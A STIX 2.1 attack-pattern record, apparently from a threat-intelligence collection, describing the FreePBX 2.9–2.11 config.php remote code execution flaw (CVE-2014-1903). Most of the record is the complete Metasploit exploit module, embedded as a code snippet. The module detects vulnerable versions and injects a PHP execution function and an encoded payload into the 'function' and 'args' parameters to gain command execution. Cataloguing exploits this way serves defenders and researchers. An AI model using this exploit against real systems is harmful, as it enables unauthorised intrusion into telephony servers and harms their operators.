{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ecc9033d-947f-4a7c-981e-0ba5132b00ff",
    "created": "2024-08-14T17:12:50.927589Z",
    "modified": "2024-08-14T17:12:50.927593Z",
    "name": "\"FreePBX config.php Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in FreePBX version 2.9, 2.10, and 2.11. It's possible to inject arbitrary PHP functions and commands in the \"/admin/config.php\" parameters \"function\" and \"args\".  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/freepbx_config_exec.rb",
            "external_id": "freepbx_config_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-1903"
        },
        {
            "source_name": "reference",
            "url": "http://issues.freepbx.org/browse/FREEPBX-7123"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"FreePBX config.php Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in FreePBX version 2.9, 2.10, and 2.11.\n        It's possible to inject arbitrary PHP functions and commands in the \"/admin/config.php\"\n        parameters \"function\" and \"args\".\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'i-Hmx', # Vulnerability discovery\n          '0x00string', # PoC\n          'xistence <xistence[at]0x90.nl>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-1903'],\n          ['OSVDB', '103240'],\n          ['EDB', '32214'],\n          ['URL', 'http://issues.freepbx.org/browse/FREEPBX-7123']\n        ],\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['FreePBX', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-03-21',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to the FreePBX installation', '/'])\n        ])\n\n      register_advanced_options(\n        [\n          OptString.new('PHPFUNC', [true, 'The PHP execution function to use', 'passthru'])\n        ])\n  end\n\n\n  def check\n    vprint_status(\"Trying to detect installed version\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, \"admin\", \"CHANGES\")\n    })\n\n    if res and res.code == 200 and res.body =~ /^(.*)$/\n      version = $1\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n    vprint_status(\"Version #{version} detected\")\n\n    if version =~ /2\\.(9|10|11)\\.0/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    rand_data = rand_text_alpha_lower(rand(10) + 5)\n\n    print_status(\"Sending payload\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, \"admin\", \"config.php\"),\n      'vars_get' => {\n        \"display\" => rand_data,\n        \"handler\" => \"api\",\n        \"function\" => datastore['PHPFUNC'],\n        \"args\" => payload.encoded\n      }\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.\n    if res and res.code != 200\n      print_error(\"Unexpected response, exploit probably failed!\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-21",
    "x_mitre_platforms": [
        "unix'"
    ]
}